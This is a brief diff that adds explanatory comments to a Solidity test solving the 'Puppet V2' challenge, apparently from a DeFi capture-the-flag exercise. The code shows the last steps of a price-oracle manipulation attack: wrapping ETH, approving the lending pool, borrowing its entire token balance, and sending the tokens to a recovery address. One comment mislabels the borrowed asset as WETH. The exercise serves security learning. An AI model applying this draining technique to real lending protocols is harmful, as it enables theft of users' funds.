@@ -112,8 +112,11 @@ contract PuppetV2Challenge is Test {
             block.timestamp
         );
         // when the price is manipulated, we can attack the pool
+        // convert eth to weth
         weth.deposit{value: player.balance}();
+        // approve lendingPool to use weth of player as collateral
         weth.approve(address(lendingPool), type(uint256).max);
+        // borrow weth
         lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
         token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
